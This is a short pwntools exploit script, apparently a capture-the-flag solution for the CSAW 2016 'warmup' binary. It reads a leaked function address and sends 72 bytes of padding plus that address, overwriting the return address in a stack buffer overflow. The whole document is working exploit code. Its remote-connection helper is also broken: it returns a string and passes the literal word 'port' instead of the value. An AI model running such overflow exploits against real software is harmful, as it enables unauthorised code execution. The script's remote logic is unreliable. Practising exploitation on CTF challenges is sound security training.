from pwn import*
context(os='linux', arch='amd64', log_level='debug')
elf = ELF('./warmup_csaw_2016')
def remote_or_local(a):
    if a == 1:
        ip = str(raw_input('[+]please input ip:'))
        port = str(raw_input('[+]please input port:'))
        return  "remote"+"('"+ip+"'"+","+"port"+")"
    elif a == 0:
       return  elf.process()
sh=remote_or_local(a = 0)
sh.recvuntil('-Warm Up-')
shell_addr = str(sh.recvlines(2)[1]).split(':')[1]
print(shell_addr)
print(p64(int(shell_addr,16)))
payload = "A"*(0x40+0x8)+p64(int(shell_addr,16))
sh.recvuntil('>')
sh.sendline(payload)
